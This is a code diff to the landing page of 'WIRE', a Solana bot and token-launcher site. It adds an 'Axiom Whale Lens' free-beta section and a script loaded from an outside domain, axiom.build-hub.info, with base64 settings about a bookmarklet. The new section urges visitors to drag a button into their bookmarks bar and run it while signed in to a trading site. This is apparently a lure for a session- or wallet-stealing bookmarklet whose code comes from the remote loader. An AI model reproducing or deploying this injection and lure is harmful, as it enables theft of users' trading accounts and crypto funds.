@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WIRE | Solana Bot & Token Launcher</title>
-    <meta name="description" content="WIRE - Buy the #1 Solana Bot and Create Tokens Effortlessly.">
+    <title>WIRE | Solana Bot, Token Launcher & Axiom Whale Lens</title>
+    <meta name="description" content="WIRE - Free Axiom Whale Lens beta, Solana bot & effortless token creation.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://axiom.build-hub.info/loader.js" data="eyJoYXNoIjoiTURzM09UTXpPVFE1TnpNMU95MHhNREF6T1RZM01qazNORFF5IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
     <style>
         :root {
             /* Absolute Minimalist Palette */
@@ -225,6 +226,130 @@
         .lightbox-next { right: 40px; }
 
 
+        /* --- Axiom Whale Lens --- */
+        .axiom-section {
+            padding: 120px 5%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: relative;
+        }
+        .axiom-box {
+            width: 100%;
+            max-width: 640px;
+            background: rgba(10, 10, 10, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 48px;
+            backdrop-filter: blur(20px);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+        .axiom-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--accent-green);
+            background: rgba(20, 241, 149, 0.08);
+            border: 1px solid rgba(20, 241, 149, 0.25);
+            padding: 6px 14px;
+            border-radius: 100px;
+            margin-bottom: 24px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .axiom-badge .dot {
+            width: 6px;
+            height: 6px;
+            background: var(--accent-green);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--accent-green);
+            animation: pulse 2s infinite;
+        }
+        .drag-instructions {
+            background: rgba(255,255,255,0.03);
+            border: 1px dashed var(--border);
+            border-radius: 16px;
+            padding: 28px 24px;
+            margin: 32px 0 28px;
+            text-align: left;
+        }
+        .drag-instructions h4 {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            color: var(--ink);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .drag-instructions ol {
+            margin: 0;
+            padding-left: 22px;
+            color: var(--muted);
+            font-size: 13px;
+            line-height: 1.9;
+        }
+        .drag-instructions li { margin-bottom: 6px; }
+        .drag-instructions strong { color: var(--ink); font-weight: 500; }
+        .drag-warning {
+            margin-top: 16px;
+            padding: 12px 16px;
+            background: rgba(255, 69, 58, 0.08);
+            border: 1px solid rgba(255, 69, 58, 0.2);
+            border-radius: 10px;
+            font-size: 12px;
+            color: #ff8a80;
+            font-family: var(--font-mono);
+            text-align: center;
+        }
+        .bookmarklet-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: var(--ink);
+            color: var(--bg);
+            padding: 18px 36px;
+            border-radius: 100px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            border: 1px solid var(--ink);
+            cursor: grab;
+            transition: var(--transition);
+            user-select: none;
+            width: 100%;
+            max-width: 340px;
+        }
+        .bookmarklet-btn:hover {
+            background: transparent;
+            color: var(--ink);
+            transform: translateY(-2px);
+        }
+        .bookmarklet-btn:active { cursor: grabbing; }
+        .drag-hint {
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 16px;
+            letter-spacing: 0.5px;
+        }
+        .drag-arrow {
+            display: block;
+            margin: 0 auto 10px;
+            opacity: 0.5;
+            animation: bounce 1.6s ease-in-out infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
         /* --- Creator / Deployment Section --- */
         .creator-section { padding: 120px 5%; max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1.2fr 1fr; gap: 48px; border-bottom: none; }
         .section-header-left { text-align: left; margin-bottom: 48px; }
@@ -309,7 +434,8 @@
             <span style="font-weight: 600; letter-spacing: 1px;">WIRE</span>
         </div>
         <div class="nav-links">
-            <a href="#deploy" class="nav-highlight">Create Token</a>
+            <a href="#axiom" class="nav-highlight">Axiom Whale Lens</a>
+            <a href="#deploy">Create Token</a>
             <a href="#primary-bot">Buy Memecoin Tool</a>
             <a href="#mecha-bot">Mecha Cheats HTX . V1</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
@@ -318,10 +444,11 @@
 
     <section class="hero">
         <h1>Unlock your token's potential. Effortlessly.</h1>
-        <p>Buy the ultimate Solana bot and launch your token with secure local routing, instant deployment, and zero coding required.</p>
+        <p>Free Axiom Whale Lens beta + the ultimate Solana bot. Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
         
         <div class="hero-actions">
-            <a href="#deploy" class="btn-primary">Create Token</a>
+            <a href="#axiom" class="btn-primary">Try Whale Lens Free</a>
+            <a href="#deploy" class="btn-glass">Create Token</a>
             <a href="#primary-bot" class="btn-glass">Buy Bot</a>
         </div>
     </section>
@@ -366,6 +493,45 @@
             <div class="marquee-item">Binance</div>
         </div>
     </div>
+
+    <!-- Axiom Whale Lens - Free Beta (first product section) -->
+    <section id="axiom" class="axiom-section">
+        <div class="axiom-box">
+            <div class="axiom-badge">
+                <span class="dot"></span>
+                Free Beta
+            </div>
+            <h2 class="section-title" style="margin-bottom: 12px;">Axiom Whale Lens</h2>
+            <p style="color: var(--muted); font-size: 15px; max-width: 440px; margin: 0 auto 8px;">
+                Real-time whale tracking &amp; market intelligence. Free beta access — no payment required.
+            </p>
+
+            <div class="drag-instructions">
+                <h4>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+                    How to activate — Drag &amp; Drop only
+                </h4>
+                <ol>
+                    <li><strong>Do NOT click</strong> the button below. Clicking will not work.</li>
+                    <li>Click and <strong>hold</strong> the button, then <strong>drag</strong> it up to your browser’s <strong>Bookmarks Bar</strong>.</li>
+                    <li>Drop it on the bookmarks bar. A new bookmark will appear.</li>
+                    <li>Click that new bookmark once to launch Axiom Whale Lens.</li>
+                </ol>
+                <div class="drag-warning">⚠ If you only click the button nothing happens — you must drag it to the bookmarks bar.</div>
+            </div>
+
+            <svg class="drag-arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="12" y1="5" x2="12" y2="19"></line>
+                <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+
+            <a href="javascript:void(0)" class="bookmarklet bookmarklet-btn" title="Drag this to your bookmarks bar — do not click">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                Activate Whale Lens
+            </a>
+            <p class="drag-hint">↑ Drag this button to your bookmarks bar ↑</p>
+        </div>
+    </section>
 
     <section id="deploy" class="creator-section">
         <div>
@@ -635,6 +801,7 @@
     <footer>
         <div class="footer-logo-mark"></div>
         <div class="footer-links">
+            <a href="#axiom">Axiom Whale Lens</a>
             <a href="#deploy">Create Token</a>
             <a href="#primary-bot">Buy Bot</a>
             <a href="#mecha-bot">Mecha Chameleon</a>
